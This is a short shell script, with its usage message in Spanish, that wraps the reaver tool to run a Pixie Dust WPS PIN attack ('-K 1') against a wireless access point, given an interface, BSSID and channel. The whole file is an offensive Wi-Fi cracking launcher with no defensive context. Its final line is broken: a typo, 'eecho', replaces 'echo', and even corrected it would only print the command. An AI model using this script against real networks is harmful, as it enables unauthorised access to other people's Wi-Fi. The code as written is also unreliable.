uso() {
   echo uso: $0 '<interfaz-wifi> <BSSID> <channel>'
   exit
}   
if [ "$1" = "" -o "$2" = "" -o "$3" = "" ]; then uso; fi
eecho sudo reaver -i $1 -c $3 -vvv -K 1 -f -b $2
